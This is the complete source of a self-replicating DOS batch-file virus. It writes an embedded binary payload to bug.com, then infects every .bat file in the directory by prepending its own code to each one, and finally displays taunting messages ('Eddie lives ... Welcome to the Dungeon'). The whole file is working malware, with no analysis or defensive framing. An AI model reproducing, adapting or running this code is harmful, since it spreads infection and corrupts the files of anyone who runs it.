@echo off
if exist bug.com goto infection
echo 1ö‹þG1Û³HþÇ1ÒJ´ŠÖÍ!t:Gt8ðtŠÐÍ!F:tè:tä1öëà´Í!	öŠðuŠÍ!ŠÍ!ŠÆ´LÍ!>bug.tmp
copy bug.tmp /a bug.com >nul
for %%a in (*.bat) do call %0 %%a
del bug.*
goto start
:infection
bug <%1 >nul
if errorlevel 255 goto end
bug <%1 >bug.tmp
bug <%0 >%1
copy %1+bug.tmp %1 >nul
echo :end>>%1
goto end
:start
echo on
:ÿ
@echo           Don't panic !
@echo Eddie lives ... somewhere in time !
@echo       Welcome to the Dungeon
@echo          I wish you luck !
:end
